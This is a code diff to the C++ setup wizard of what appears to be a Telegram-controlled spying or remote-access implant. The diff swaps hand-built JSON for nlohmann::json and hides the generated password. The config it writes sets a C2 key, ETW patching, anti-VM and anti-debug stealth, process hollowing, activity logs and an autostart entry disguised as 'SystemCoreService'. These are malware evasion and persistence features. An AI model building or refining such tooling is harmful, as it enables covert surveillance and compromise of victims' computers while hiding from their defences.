@@ -8,6 +8,8 @@
 #include <algorithm>
 #include <random>
 
+#include <nlohmann/json.hpp>
+
 namespace nuub::domain {
 
 class Installer {
@@ -104,16 +106,16 @@ public:
         }
 
         // Step 3: PC Identifier
-        std::cout << "\n[3/5] PC Configuration" << std::endl;
+        std::cout << "\n[3/6] PC Configuration" << std::endl;
         std::string pc_id = read_line("PC Identifier", "PC-001");
 
         // Step 4: Encryption Password
-        std::cout << "\n[4/5] Security Configuration" << std::endl;
+        std::cout << "\n[4/6] Security Configuration" << std::endl;
         std::string enc_password = read_line("Encryption Password (leave empty for random)");
 
         if (enc_password.empty()) {
             enc_password = random_string(16);
-            std::cout << "Generated: " << enc_password << std::endl;
+            std::cout << "Password generated (saved in config)." << std::endl;
         }
 
         // Step 5: Advanced
@@ -127,30 +129,36 @@ public:
         bool etw_patch = read_yes_no("Enable ETW patching", true);
         bool stealth = read_yes_no("Enable stealth mode (anti-VM + anti-debug)", false);
 
-        // Generate JSON
-        std::string json = "{\n";
-        json += "    \"telegram_bot_token\": \"" + bot_token + "\",\n";
-        json += "    \"admin_chat_id\": " + admin_ids[0] + ",\n";
-        json += "    \"admin_chat_ids\": [";
-        for (size_t i = 0; i < admin_ids.size(); ++i) {
-            if (i > 0) json += ", ";
-            json += admin_ids[i];
+        // Generate JSON using nlohmann::json (safe, no injection)
+        nlohmann::json j;
+        j["telegram_bot_token"] = bot_token;
+
+        // Parse admin IDs as integers
+        std::vector<int64_t> admin_ids_int;
+        for (const auto& id : admin_ids) {
+            try {
+                admin_ids_int.push_back(std::stoll(id));
+            } catch (...) {
+                std::cerr << "[WARNING] Invalid chat ID ignored: " << id << std::endl;
+            }
         }
-        json += "],\n";
-        json += "    \"pc_identifier\": \"" + pc_id + "\",\n";
-        json += "    \"encryption_password\": \"" + enc_password + "\",\n";
-        json += "    \"master_log_filename\": \"log_master.txt\",\n";
-        json += "    \"activity_log_filename\": \"activity_log.csv\",\n";
-        json += "    \"auto_start_entry_name\": \"SystemCoreService\",\n";
-        json += "    \"log_filename\": \"nuub.log\",\n";
-        json += "    \"heartbeat_interval_minutes\": " + std::to_string(heartbeat) + ",\n";
-        json += "    \"c2_encryption_key\": \"\",\n";
-        json += "    \"stealth_mode\": " + std::string(stealth ? "true" : "false") + ",\n";
-        json += "    \"anti_debug\": " + std::string(anti_debug ? "true" : "false") + ",\n";
-        json += "    \"anti_vm\": " + std::string(anti_vm ? "true" : "false") + ",\n";
-        json += "    \"etw_patch\": " + std::string(etw_patch ? "true" : "false") + ",\n";
-        json += "    \"process_hollowing\": false\n";
-        json += "}\n";
+        j["admin_chat_id"] = admin_ids_int.empty() ? 0 : admin_ids_int[0];
+        j["admin_chat_ids"] = admin_ids_int;
+        j["pc_identifier"] = pc_id;
+        j["encryption_password"] = enc_password;
+        j["master_log_filename"] = "log_master.txt";
+        j["activity_log_filename"] = "activity_log.csv";
+        j["auto_start_entry_name"] = "SystemCoreService";
+        j["log_filename"] = "nuub.log";
+        j["heartbeat_interval_minutes"] = heartbeat;
+        j["c2_encryption_key"] = "";
+        j["stealth_mode"] = stealth;
+        j["anti_debug"] = anti_debug;
+        j["anti_vm"] = anti_vm;
+        j["etw_patch"] = etw_patch;
+        j["process_hollowing"] = false;
+
+        std::string json = j.dump(4);
 
         // Write config
         std::ofstream file(config_path);
